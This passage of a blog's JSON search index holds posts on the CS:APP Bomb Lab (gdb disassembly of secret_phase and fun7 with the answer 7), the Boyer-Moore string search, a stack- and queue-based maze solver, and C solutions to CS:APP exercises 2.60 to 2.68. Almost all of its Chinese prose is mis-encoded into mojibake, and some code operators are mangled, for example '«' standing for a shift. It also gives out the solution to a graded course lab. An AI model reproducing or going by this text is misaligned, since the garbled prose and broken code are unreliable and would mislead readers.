çš„,æŸ¥çœ‹æ±‡ç¼–å‘ç°,åœ¨ phase_4 ç­”æ¡ˆä¹‹åè¾“å…¥ DrEvil å³å¯è¿›å…¥ secret_phase. (gdb) disas secret_phase Dump of assembler code for function secret_phase: 0x0000000000401191 \u003c+0\u003e: push %rbx 0x0000000000401192 \u003c+1\u003e: callq 0x40155c \u003cread_line\u003e 0x0000000000401197 \u003c+6\u003e: mov $0xa,%edx 0x000000000040119c \u003c+11\u003e: mov $0x0,%esi 0x00000000004011a1 \u003c+16\u003e: mov %rax,%rdi 0x00000000004011a4 \u003c+19\u003e: callq 0x400b80 \u003cstrtol@plt\u003e 0x00000000004011a9 \u003c+24\u003e: mov %rax,%rbx 0x00000000004011ac \u003c+27\u003e: lea -0x1(%rax),%eax 0x00000000004011af \u003c+30\u003e: cmp $0x3e8,%eax 0x00000000004011b4 \u003c+35\u003e: jbe 0x4011bb \u003csecret_phase+42\u003e 0x00000000004011b6 \u003c+37\u003e: callq 0x4014e4 \u003cexplode_bomb\u003e 0x00000000004011bb \u003c+42\u003e: mov %ebx,%esi 0x00000000004011bd \u003c+44\u003e: mov $0x603230,%edi 0x00000000004011c2 \u003c+49\u003e: callq 0x401153 \u003cfun7\u003e 0x00000000004011c7 \u003c+54\u003e: cmp $0x4,%eax 0x00000000004011ca \u003c+57\u003e: je 0x4011d1 \u003csecret_phase+64\u003e 0x00000000004011cc \u003c+59\u003e: callq 0x4014e4 \u003cexplode_bomb\u003e 0x00000000004011d1 \u003c+64\u003e: mov $0x4024d0,%edi 0x00000000004011d6 \u003c+69\u003e: callq 0x400ac0 \u003cputs@plt\u003e 0x00000000004011db \u003c+74\u003e: callq 0x401682 \u003cphase_defused\u003e 0x00000000004011e0 \u003c+79\u003e: pop %rbx 0x00000000004011e1 \u003c+80\u003e: retq ---Type \u003creturn\u003e to continue, or q \u003creturn\u003e to quit--- End of assembler dump. (gdb) disas fun7 Dump of assembler code for function fun7: 0x0000000000401153 \u003c+0\u003e: sub $0x8,%rsp 0x0000000000401157 \u003c+4\u003e: test %rdi,%rdi 0x000000000040115a \u003c+7\u003e: je 0x401187 \u003cfun7+52\u003e 0x000000000040115c \u003c+9\u003e: mov (%rdi),%edx 0x000000000040115e \u003c+11\u003e: cmp %esi,%edx 0x0000000000401160 \u003c+13\u003e: jle 0x40116f \u003cfun7+28\u003e 0x0000000000401162 \u003c+15\u003e: mov 0x8(%rdi),%rdi 0x0000000000401166 \u003c+19\u003e: callq 0x401153 \u003cfun7\u003e 0x000000000040116b \u003c+24\u003e: add %eax,%eax 0x000000000040116d \u003c+26\u003e: jmp 0x40118c \u003cfun7+57\u003e 0x000000000040116f \u003c+28\u003e: mov $0x0,%eax 0x0000000000401174 \u003c+33\u003e: cmp %esi,%edx 0x0000000000401176 \u003c+35\u003e: je 0x40118c \u003cfun7+57\u003e 0x0000000000401178 \u003c+37\u003e: mov 0x10(%rdi),%rdi 0x000000000040117c \u003c+41\u003e: callq 0x401153 \u003cfun7\u003e 0x0000000000401181 \u003c+46\u003e: lea 0x1(%rax,%rax,1),%eax 0x0000000000401185 \u003c+50\u003e: jmp 0x40118c \u003cfun7+57\u003e 0x0000000000401187 \u003c+52\u003e: mov $0xffffffff,%eax 0x000000000040118c \u003c+57\u003e: add $0x8,%rsp 0x0000000000401190 \u003c+61\u003e: retq End of assembler dump. æ­¤é¢˜é¢˜æ„ä¸ºåœ¨ä¸€ä¸ªé¢˜ç›®ä¸­æ„å»ºå¥½çš„å¹³è¡¡äºŒå‰æ ‘ä¸­ä»æ ¹èŠ‚ç‚¹å¼€å§‹æŸ¥æ‰¾ä¸€ä¸ªè¾“å…¥çš„æ•°. ç”±èŠ‚ç‚¹å‘å·¦ä¸º 0,ç”±èŠ‚ç‚¹å‘å³ä¸º 1,æŸ¥æ‰¾è·¯å¾„åºçš„ 0-1 åˆ—ä»å³å‘å·¦æ„æˆä¸€ä¸ªäºŒè¿›åˆ¶æ•°,è¯¥ äºŒè¿›åˆ¶æ•°çš„åè¿›åˆ¶å€¼å¿…é¡»ç­‰äºé¢˜ç›®ä¸­æä¾›çš„æ•°,å…¶ä¸º 4,é‚£ä¹ˆæ‰€éœ€æŸ¥æ‰¾è·¯å¾„åºåˆ—ä¸º 100, æ ¹æ®äºŒå‰æ ‘ç»“æ„,åº”è¯¥æŸ¥æ‰¾ 7,æ•…ç­”æ¡ˆä¸º 7. ","date":"2018-12-01","objectID":"/posts/csapp-bomb-lab/:1:8","tags":["CS:APP","æ±‡ç¼–","äºŒè¿›åˆ¶ç‚¸å¼¹"],"title":"CS:APP Bomb lab","uri":"/posts/csapp-bomb-lab/"},{"categories":["CS:APP"],"content":"è¿è¡Œæˆªå›¾ ","date":"2018-12-01","objectID":"/posts/csapp-bomb-lab/:1:9","tags":["CS:APP","æ±‡ç¼–","äºŒè¿›åˆ¶ç‚¸å¼¹"],"title":"CS:APP Bomb lab","uri":"/posts/csapp-bomb-lab/"},{"categories":["æ•°æ®ç»“æ„"],"content":"è®¾è®¡æ€è·¯ BM ç®—æ³•æ˜¯ä¸€ç§åç¼€åŒ¹é…ç®—æ³•,å…¶å…·æœ‰æ¯” KMP ç®—æ³•æ›´ä¼˜ç§€çš„æ€§èƒ½è¡¨ç°.å…¶æ ¸å¿ƒæ€æƒ³æœ‰äºŒ ,ç¬¬ä¸€æ˜¯åå­—ç¬¦,åå­—ç¬¦å°±æ˜¯ pattern ä¸ text ä»å³å¾€å·¦ç¬¬ä¸€å¤±é…çš„åœ¨ text ä¸­çš„å­—ç¬¦, äºŒæ˜¯å¥½åç¼€,å¥½åç¼€å°±æ˜¯ pattern ä¸ text ä»å³å¾€å·¦è¿ç»­åŒ¹é…æˆåŠŸçš„å­ä¸².å¯¹äºåå­—ç¬¦ å’Œå¥½åç¼€,æœ‰å„è‡ªçš„æ¨¡å¼ä¸²ç§»åŠ¨è§„åˆ™,å¯ä»¥ç¡®å®šå„è‡ªå¤±é…æ—¶éœ€è¦ç§»åŠ¨çš„ä½æ•°,æœ€ç»ˆé€‰ æ‹©äºŒè€…ä¸­ç§»åŠ¨ä½æ•°è¾ƒå¤§è€…ç§»åŠ¨.åœ¨ä¸»å‡½æ•°ä¸­,è®©ç”¨æˆ·è¾“å…¥æ–‡æ¡£åä¸éœ€è¦æŸ¥æ‰¾çš„å•è¯. æ¯æ¬¡ä»æ–‡æ¡£ä¸­è¯»å–ä¸€è¡Œè¿›è¡ŒåŒ¹é…æœç´¢,æ¯æ¬¡ä½¿ç”¨ BM ç®—æ³•æœç´¢å®Œæˆå,è‹¥æœç´¢åˆ°å•è¯, åˆ™å°†ä¸»ä¸²ä¸­å¼€å§‹åŒ¹é…çš„ä½ç½®å®šä¸ºæŸ¥æ‰¾åˆ°å•è¯çš„ä¸‹ä¸€è¡Œ,ä½¿ç”¨ BM ç®—æ³•è¿›è¡Œä¸‹ä¸€ä¸ªåŒ¹é… æœç´¢,ç›´è‡³æœç´¢å®Œå½“å‰è¡Œ.è€Œåå¾ªç¯ç›´è‡³åŒ¹é…å®Œæ•´ä¸ªæ–‡æ¡£. ","date":"2018-12-01","objectID":"/posts/ds-bm/:1:0","tags":["ä¸²åŒ¹é…"],"title":"æ•°æ®ç»“æ„:BMç®—æ³•","uri":"/posts/ds-bm/"},{"categories":["æ•°æ®ç»“æ„"],"content":"ä»£ç è¯´æ˜ int* CreateBC(char* pattern, int len); ä¼ å…¥æ¨¡å¼ä¸²åŠå…¶é•¿åº¦,è¿”å›æ ¹æ®åå­—ç¬¦çš„è·³è½¬æ•°ç»„. int* CreateSuffix(char* pattern, int len); int* CreateGS(char* pattern, int len); ä¸¤ä¸ªå‡½æ•°éƒ½éœ€è¦ä¼ å…¥æ¨¡å¼ä¸²åŠå…¶é•¿åº¦,ç¬¬ä¸€ä¸ªå‡½æ•°è¿”å›å…¶åç¼€æ•°ç»„,ç¬¬äºŒä¸ªå‡½æ•°è°ƒ ç”¨ç¬¬ä¸€ä¸ªå‡½æ•°è¿”å›æ ¹æ®å¥½åç¼€çš„è·³è½¬æ•°ç»„. int bm_search(char* text, int text_len, char* pattern, int pattern_len, int *bc, int *gs); ä¼ å…¥ä¸»ä¸²åŠå…¶é•¿åº¦,æ¨¡å¼ä¸²åŠå…¶é•¿åº¦,åå­—ç¬¦è·³è½¬æ•°ç»„,å¥½åç¼€è·³è½¬æ•°ç»„.è¿”å›åœ¨ä¸»ä¸² ä¸­æŸ¥æ‰¾åˆ°æ¨¡å¼ä¸²çš„ç¬¬ä¸€ä¸ªä½ç½®,æœªæŸ¥æ‰¾åˆ°,åˆ™è¿”å›-1. char* get_line(FILE *article, char (\u0026text)[1000]); ä»ç»™å®šçš„ article æ–‡ä»¶ä¸­è¯»å–æœ€å¤§ 1000 å­—ç¬¦çš„ä¸€è¡Œ,å­˜åœ¨ text ä½ç½®,è¯»å–åˆ°æ–‡ä»¶æœ«å°¾ åˆ™è¿”å› NULL. ","date":"2018-12-01","objectID":"/posts/ds-bm/:2:0","tags":["ä¸²åŒ¹é…"],"title":"æ•°æ®ç»“æ„:BMç®—æ³•","uri":"/posts/ds-bm/"},{"categories":["æ•°æ®ç»“æ„"],"content":"è¿è¡Œç»“æœ æ­¤ä¸ºä»é©¬ä¸è·¯å¾·é‡‘çš„ I hava a dream æ¼”è®²ç¨¿ä¸­æŸ¥æ‰¾ dream å¾—å‡ºçš„ç»“æœ. ","date":"2018-12-01","objectID":"/posts/ds-bm/:3:0","tags":["ä¸²åŒ¹é…"],"title":"æ•°æ®ç»“æ„:BMç®—æ³•","uri":"/posts/ds-bm/"},{"categories":["æ•°æ®ç»“æ„"],"content":"è®¾è®¡æ€è·¯ ","date":"2018-11-10","objectID":"/posts/ds-maze/:1:0","tags":["æ•°æ®ç»“æ„","è¿·å®«é—®é¢˜"],"title":"æ•°æ®ç»“æ„:è¿·å®«é—®é¢˜","uri":"/posts/ds-maze/"},{"categories":["æ•°æ®ç»“æ„"],"content":"å›¾ç¼–å· å¦‚å›¾æ‰€ç¤ºï¼Œä»ä¸Šåˆ°ä¸‹ï¼Œä»å·¦åˆ°å³ï¼Œç»™ 17 ä¸ªé¡¶ç‚¹è¿›è¡Œç¼–å·ï¼Œä»¥ä¸¤ä¸ªé¡¶ç‚¹ä»£è¡¨ä¸€æ¡è¾¹ï¼Œä¾‹å…¥ 2-3 ä»£è¡¨å¯ä»¥ä»é¡¶ç‚¹ 2 èµ°åˆ°é¡¶ç‚¹ 3ã€‚é—®é¢˜å³ä¸ºæ±‚è§£ä» 2 -\u003e 17 çš„é€šè·¯ã€‚ ","date":"2018-11-10","objectID":"/posts/ds-maze/:1:1","tags":["æ•°æ®ç»“æ„","è¿·å®«é—®é¢˜"],"title":"æ•°æ®ç»“æ„:è¿·å®«é—®é¢˜","uri":"/posts/ds-maze/"},{"categories":["æ•°æ®ç»“æ„"],"content":"æ±‚è§£æ€æƒ³ æ±‚è§£ä¸€æ¡é€šè·¯ï¼Œåº”å½“ä»èµ·ç‚¹å‡ºå‘ï¼Œä¸æ–­å‰è¿›åˆ°åç»­å¯è¡Œé¡¶ç‚¹ï¼Œå½“åœ¨ä¸€ä¸ªé¡¶ç‚¹æ— æ³•ç»§ç»­å‰è¿›æ—¶ï¼Œåˆ™å›é€€åˆ°ä¸Šä¸€ä¸ªé¡¶ç‚¹ï¼Œå¯»æ‰¾å…¶ä»–å¯è¡Œé¡¶ç‚¹ï¼Œç›´åˆ°åˆ°è¾¾ç»ˆç‚¹ã€‚æ­¤æ€æƒ³ç¬¦åˆæ•°æ®ç»“æ„æ ˆçš„ç‰¹ç‚¹ã€‚é¦–å…ˆå°†èµ·ç‚¹å‹æ ˆï¼Œç„¶åå°†ä»å½“å‰é¡¶ç‚¹å¯åˆ°è¾¾çš„ä¸€ä¸ªé¡¶ç‚¹å‹æ ˆï¼Œç„¶åå°†è¯¥é¡¶ç‚¹æ ‡è®°ä¸ºå·²è®¿é—®ï¼Œéšååˆ°è¾¾ä¸‹ä¸€ä¸ªé¡¶ç‚¹ï¼Œåœ¨æŸä¸ªé¡¶ç‚¹æ— æ³•ç»§ç»­èµ°é€šæ—¶ï¼Œå°†å½“å‰é¡¶ç‚¹å‡ºæ ˆï¼Œå›é€€åˆ°ä¸Šä¸€ä¸ªé¡¶ç‚¹é‡æ–°é€‰æ‹©å¯ä»¥åˆ°è¾¾çš„ä¸”æœªè®¿é—®çš„é¡¶ç‚¹ã€‚å¦‚æ­¤å¾ªç¯ï¼Œç›´åˆ°ç»ˆç‚¹è¢«å‹å…¥æ ˆä¸­ï¼Œæ­¤æ—¶æ ˆä¸­æ‰€æœ‰é¡¶ç‚¹å³ä¸ºä¸€æ¡é€šè·¯ã€‚ æ±‚è§£ä¸€æ¡æœ€çŸ­è·¯å¾„ï¼Œåº”å½“ä»èµ·ç‚¹å‡ºå‘ï¼Œè®¿é—®æ‰€æœ‰å¯ä»¥åˆ°è¾¾çš„ä¸‹ä¸€çº§é¡¶ç‚¹ã€‚å†ä»æ‰€æœ‰ä¸‹ä¸€çº§é¡¶ç‚¹å‡ºå‘ï¼Œè®¿é—®æ‰€æœ‰å¯è®¿é—®çš„å†ä¸‹ä¸€çº§é¡¶ç‚¹ï¼Œå¦‚æ­¤å¾ªç¯ï¼Œæ¯ä¸€çº§é¡¶ç‚¹è·èµ·ç‚¹è·ç¦»ç›¸åŒã€‚è¿‡ç¨‹ä¸­è®°å½•è·¯çº¿ã€‚æ­¤æƒ³æ³•ç¬¦åˆæ•°æ®ç»“æ„ä¸­é˜Ÿåˆ—çš„ç‰¹ç‚¹ã€‚é¦–å…ˆï¼Œå°†èµ·ç‚¹å…¥é˜Ÿã€‚ç„¶åå°†é˜Ÿå¤´å…ƒç´ å‡ºé˜Ÿï¼Œå°†è¯¥å…ƒç´ å¯è®¿é—®åˆ°çš„ä¸”æœªè¢«è®¿é—®çš„é¡¶ç‚¹ç½®ä¸ºå·²è®¿é—®ï¼Œç„¶åå…¥é˜Ÿï¼Œæ³¨æ„è®°å½•è¢«å…¥é˜ŸèŠ‚ç‚¹çš„å‰ä¸€ä¸ªèŠ‚ç‚¹ã€‚ç›´åˆ°é˜Ÿåˆ—ä¸ºç©ºã€‚æœ€åé¡ºç€ç»ˆç‚¹çš„å‰é©±é¡¶ç‚¹è¾“å‡ºå³å¯å¾—åˆ°è·¯çº¿ã€‚è‹¥æœ‰å¤šä¸ªç»ˆç‚¹ï¼Œè¦å¯»æ‰¾åˆ°æœ€è¿‘çš„ç»ˆç‚¹å‡ºå»ï¼Œåˆ™å°†ç»“æŸå¾ªç¯æ¡ä»¶æ”¹ä¸ºæœ‰ç»ˆç‚¹å…¥é˜Ÿå³å¯ã€‚ ","date":"2018-11-10","objectID":"/posts/ds-maze/:1:2","tags":["æ•°æ®ç»“æ„","è¿·å®«é—®é¢˜"],"title":"æ•°æ®ç»“æ„:è¿·å®«é—®é¢˜","uri":"/posts/ds-maze/"},{"categories":["æ•°æ®ç»“æ„"],"content":"ä»£ç è¯´æ˜ ","date":"2018-11-10","objectID":"/posts/ds-maze/:2:0","tags":["æ•°æ®ç»“æ„","è¿·å®«é—®é¢˜"],"title":"æ•°æ®ç»“æ„:è¿·å®«é—®é¢˜","uri":"/posts/ds-maze/"},{"categories":["æ•°æ®ç»“æ„"],"content":"ç»“æ„ä½“åŠå…¨å±€å˜é‡å®šä¹‰ typedef struct p //è¡¨ç¤ºé¡¶ç‚¹,ç”¨äºå¯»æ‰¾æœ€çŸ­è·¯å¾„æ—¶è®°å½•è·¯å¾„ { int code; struct p* pre; //å‰ä¸€ä¸ªé¡¶ç‚¹ } Ver; const int edge_cnt = 29; //è¾¹çš„æ•°é‡ const int ver_cnt = 17; //é¡¶ç‚¹æ•°é‡ int map[edge_cnt][2]; //è®°å½•è¾¹ int my_stack[MAX] = {0}; //æ•°ç»„æ¨¡æ‹Ÿæ ˆ int my_quque[MAX] = {0}; //æ•°ç»„æ¨¡æ‹Ÿé˜Ÿåˆ— int top = 0; //æ ˆé¡¶æŒ‡ç¤º int front = 0, rear = 0; //é˜Ÿåˆ—é¦–ä½æŒ‡ç¤º bool visit[ver_cnt + 1] = {false}; //è®°å½•ç‚¹æ˜¯å¦è®¿é—®è¿‡ Ver vers[ver_cnt + 1]; //æ¯ä¸ªç‚¹è·¯å¾„é“¾è¡¨å¤´ç»“ç‚¹ ","date":"2018-11-10","objectID":"/posts/ds-maze/:2:1","tags":["æ•°æ®ç»“æ„","è¿·å®«é—®é¢˜"],"title":"æ•°æ®ç»“æ„:è¿·å®«é—®é¢˜","uri":"/posts/ds-maze/"},{"categories":["æ•°æ®ç»“æ„"],"content":"å‡½æ•°å®šä¹‰ void loadmaze(); //è¯»å…¥è¿·å®«åœ°å›¾ void visited(int i); //å°†ç‚¹içŠ¶æ€ç½®ä¸ºè®¿é—®è¿‡ bool isvisited(int i); //åˆ¤æ–­ç‚¹iæ˜¯å¦è®¿é—®è¿‡ bool hasway(int s); //ä»ç‚¹så‡ºå‘æ˜¯å¦æœ‰æ²¡å»è¿‡çš„å¯è¡Œè·¯å¾„ void find_way(int start, int end); //æ‰¾åˆ°ä¸€æ¡é€šè·¯ void find_least(int start, int end); //æ‰¾åˆ°ä¸€æ¡æœ€çŸ­è·¯å¾„ ","date":"2018-11-10","objectID":"/posts/ds-maze/:2:2","tags":["æ•°æ®ç»“æ„","è¿·å®«é—®é¢˜"],"title":"æ•°æ®ç»“æ„:è¿·å®«é—®é¢˜","uri":"/posts/ds-maze/"},{"categories":["æ•°æ®ç»“æ„"],"content":"è¿è¡Œç»“æœ ","date":"2018-11-10","objectID":"/posts/ds-maze/:3:0","tags":["æ•°æ®ç»“æ„","è¿·å®«é—®é¢˜"],"title":"æ•°æ®ç»“æ„:è¿·å®«é—®é¢˜","uri":"/posts/ds-maze/"},{"categories":["æ•°æ®ç»“æ„"],"content":"å®éªŒæ€»ç»“ æœ¬æ¬¡å®éªŒï¼Œæ±‚è§£è¿·å®«é€šè·¯å’Œæœ€çŸ­é€šè·¯ï¼Œåœ¨ä¸åˆ©ç”¨é€’å½’çš„æƒ…å†µä¸‹ï¼Œä½¿ç”¨æ¨¡æ‹Ÿçš„æ ˆå’Œé˜Ÿåˆ—ï¼Œå®ç°äº†æ·±åº¦ä¼˜å…ˆæœç´¢å’Œå¹¿åº¦ä¼˜å…ˆæœç´¢ã€‚åŠ å¼ºäº†å¯¹äºæ ˆå’Œé˜Ÿåˆ—çš„ç†è§£ä»¥åŠä½¿ç”¨ç†Ÿç»ƒåº¦ã€‚ ","date":"2018-11-10","objectID":"/posts/ds-maze/:4:0","tags":["æ•°æ®ç»“æ„","è¿·å®«é—®é¢˜"],"title":"æ•°æ®ç»“æ„:è¿·å®«é—®é¢˜","uri":"/posts/ds-maze/"},{"categories":["CS:APP"],"content":"CS:APP 2.60 #include \u003cstdio.h\u003e unsigned replace_byte(unsigned x, int i, unsigned char b) { x = x \u0026 (~(0XFF \u003c\u003c (i \u003c\u003c 3)));//ç›¸åº”å­—èŠ‚ç½®é›¶ x = x | (b \u003c\u003c (i \u003c\u003c 3)); //ç›¸åº”å­—èŠ‚æ”¹ä¸ºchar b return x; } int main() { unsigned ret = replace_byte(0X12345678, 1, 0XAB); printf(\"0X%X\\n\", ret); return 0; } 0X1234AB78 åˆ©ç”¨æŒ‰ä½è¿ç®—$x \\\u0026 1 = x , b | 0 = b$ã€‚ ","date":"2018-11-08","objectID":"/posts/csapp-problems/:1:0","tags":["CS:APP"],"title":"CS:APPè§£é¢˜è®°å½•","uri":"/posts/csapp-problems/"},{"categories":["CS:APP"],"content":"Csapp 2.65 #include \u003cstdio.h\u003e int odd_ones(unsigned x) { x ^= x \u003e\u003e 16; x ^= x \u003e\u003e 8; x ^= x \u003e\u003e 4; x ^= x \u003e\u003e 2; x ^= x \u003e\u003e 1; return x \u0026 1; } int main() { int x = odd_ones(0XB); printf(\"%d\\n\", x); return 0; } 1 å¯¹ 32 ä½ç¼–ç ï¼Œ1 äº¦æˆ–æ‰€æœ‰ 0 ä»ä¸º 1ï¼Œå¶æ•°ä¸ª 1 è¿ç»­äº¦æˆ–ç»“æœä¸º 0ï¼Œå¥‡æ•°ä¸ª 1 è¿ç»­äº¦æˆ–ç»“æœä¸º 1ã€‚å¯¹ 32 ä½æ•°ï¼ŒæŒ‰ç…§å³ç§» 16ï¼Œ8ï¼Œ4ï¼Œ2ï¼Œ1 ä¾æ¬¡å³ç§»ä½¿å¾—å‰åå„äºŒåˆ†ä¹‹ä¸€ç¼–ç å¯¹é½ï¼Œäº¦æˆ–ç»“æœå­˜åœ¨åäºŒåˆ†ä¹‹ä¸€ç¼–ç ä¸­ï¼Œç›´è‡³äº¦æˆ–æ€»ç»“è¿‡å­˜äºæœ€ä½ä½ä¸­ï¼Œç»“æŸï¼Œå–æœ€ä½ä½è¿”å›ã€‚ ","date":"2018-11-08","objectID":"/posts/csapp-problems/:2:0","tags":["CS:APP"],"title":"CS:APPè§£é¢˜è®°å½•","uri":"/posts/csapp-problems/"},{"categories":["CS:APP"],"content":"Csapp 2.67 ","date":"2018-11-08","objectID":"/posts/csapp-problems/:3:0","tags":["CS:APP"],"title":"CS:APPè§£é¢˜è®°å½•","uri":"/posts/csapp-problems/"},{"categories":["CS:APP"],"content":"A åœ¨ int ä¸º w ä½çš„æœºå™¨ä¸­ï¼Œç§»ä½é•¿åº¦ä¸åº”è¯¥è¶…è¿‡$w - 1$ã€‚ ","date":"2018-11-08","objectID":"/posts/csapp-problems/:3:1","tags":["CS:APP"],"title":"CS:APPè§£é¢˜è®°å½•","uri":"/posts/csapp-problems/"},{"categories":["CS:APP"],"content":"B #include \u003cstdio.h\u003e #include \u003climits.h\u003e int int_size_is_32() { return 1 \u003c\u003c 31 == INT_MIN; } int main() { printf(\"%d\\n\", int_size_is_32()); return 0; } 1 è‹¥ int ä¸º 32 ä½,åˆ™$1 Â« 31 ==$ INT_MIN. ","date":"2018-11-08","objectID":"/posts/csapp-problems/:3:2","tags":["CS:APP"],"title":"CS:APPè§£é¢˜è®°å½•","uri":"/posts/csapp-problems/"},{"categories":["CS:APP"],"content":"C #include \u003cstdio.h\u003e #include \u003climits.h\u003e int int_size_is_32_for_16() { return (1 \u003c\u003c 15 != INT_MIN) \u0026\u0026 ((1 \u003c\u003c 31) == INT_MIN); } int main() { printf(\"%d\\n\", int_size_is_32_for_16()); return 0; } 1 å½“$1 Â« 15 !=$ INT_MINï¼Œè¯æ˜ int é 16 ä½åï¼Œåé¢å³å¯åˆ¤æ–­ int æ˜¯å¦ä¸º 32 ä½. ","date":"2018-11-08","objectID":"/posts/csapp-problems/:3:3","tags":["CS:APP"],"title":"CS:APPè§£é¢˜è®°å½•","uri":"/posts/csapp-problems/"},{"categories":["CS:APP"],"content":"Csapp 2.68 #include \u003cstdio.h\u003e int lower_one_mask(int n) { return (int)(0XFFFFFFFFu \u003e\u003e (32 - n)); } int main() { printf(\"0X%X\\n\", lower_one_mask(6)); return 0; } 0X3F å°†æ— ç¬¦å· int æœ€å¤§å€¼å³ç§»$(32 - n)$ä½ï¼Œè¿›è¡Œäº†é€»è¾‘å³ç§»ï¼Œå†å¼ºåˆ¶è½¬æ¢ä¸ºæœ‰ç¬¦å· intã€‚ ","date":"2018-11-08","objectID":"/posts/csapp-problems/:4:0","tags":["CS:APP"],"title":"CS:APPè§£é¢˜è®°å½•","uri":"/posts/csapp-problems/"}]